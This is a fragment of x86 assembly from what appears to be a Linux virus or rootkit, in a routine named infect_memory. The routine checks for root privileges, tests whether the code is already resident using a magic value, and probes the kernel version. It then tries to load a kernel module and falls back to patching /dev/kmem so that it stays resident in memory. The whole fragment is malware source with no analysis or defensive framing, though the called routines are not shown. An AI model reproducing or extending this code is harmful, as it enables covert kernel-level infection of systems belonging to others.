;------------------------------------------------------------------------------
infect_memory:	pusha

		movb	eax, 49
		int	0x80				; geteuid
		dec	eax
		jns	.failed

		movb	eax, 11
		push	dword 0x0000dead
		mov	ebx, esp
		movb	ecx, 0
		movb	edx, 0
		int	0x80				; already resident?
		or	eax, eax
		pop	ebx				; clean stack
		jz	.failed		

; PREAD(2)
; 	The pread and pwrite system calls were added to  Linux  in
; 	version  2.1.60; the entries in the i386 system call table
; 	were added in 2.1.69.
		pusha
		xor	eax, eax
		mov	al,  180
		xor	ebx, ebx
		dec	ebx
		xor	ecx, ecx
		xor	edx, edx
		xor	esi, esi
		xor	edi, edi
		int	0x80				; pread
		mov	[esp + 0x1c], eax
		popa
		cmp	eax, -ENOSYS
		je	.failed				; kernel 2.0, skip...
		
		call	load_module
		or	eax, eax
		jz	.failed
		
		; module loader failed, try to patch /dev/kmem
		call	patch_kmem

.failed:	popa
		ret
;------------------------------------------------------------------------------